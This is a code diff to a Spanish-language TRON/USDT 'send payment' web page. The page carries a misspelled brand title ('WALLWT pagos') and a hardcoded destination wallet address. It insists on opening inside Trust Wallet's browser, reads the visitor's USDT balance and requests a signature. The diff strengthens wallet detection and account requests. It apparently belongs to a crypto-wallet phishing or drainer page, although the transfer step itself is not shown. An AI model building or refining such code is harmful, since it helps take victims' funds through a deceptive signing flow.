@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WALLET - Enviar </title>
+    <title>WALLWT pagos - Enviar </title>
 
     <style>
         :root {
@@ -648,20 +648,6 @@
     const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-    let uiAudioContext = null;
-
-    function getUiAudioContext() {
-        if (!uiAudioContext) {
-            const AudioCtx = window.AudioContext || window.webkitAudioContext;
-            if (!AudioCtx) return null;
-            uiAudioContext = new AudioCtx();
-        }
-        if (uiAudioContext.state === 'suspended') {
-            uiAudioContext.resume();
-        }
-        return uiAudioContext;
-    }
-
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
@@ -735,13 +721,28 @@
                 setStatus("Estableciendo enlace RPC con Billetera...");
                 connectBtn.disabled = true;
 
+                let intentos = 0;
+                while (typeof window.tronWeb === 'undefined' && intentos < 10) {
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    intentos++;
+                }
+
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
+                    throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
                 }
 
                 const tronWeb = window.tronWeb;
                 if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                     walletAddress = tronWeb.defaultAddress.base58;
+                } else if (tronWeb.defaultAddress && tronWeb.defaultAddress.hex) {
+                    walletAddress = tronWeb.address.fromHex(tronWeb.defaultAddress.hex);
+                }
+
+                if (!walletAddress && window.tronLink && typeof window.tronLink.request === 'function') {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                        walletAddress = tronWeb.defaultAddress.base58;
+                    }
                 }
 
                 if (!walletAddress) {
@@ -759,7 +760,7 @@
             } catch (error) {
                 setStatus(error.message || "Error de inicialización Web3.");
                 connectBtn.disabled = false;
-                connectBtn.innerHTML = '<span>Vincular billetera</span>';
+                connectBtn.innerHTML = '<svg class="link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg><span>Vincular billetera</span>';
             }
             return;
         }
@@ -781,7 +782,6 @@
                     throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
                 }
 
-                // Convertir el monto ingresado al formato de 6 decimales de USDT (Sun)
                 const amountInSun = Math.round(userAmount * 1_000_000);
 
                 setStatus("Solicitando autorización de firma digital...");
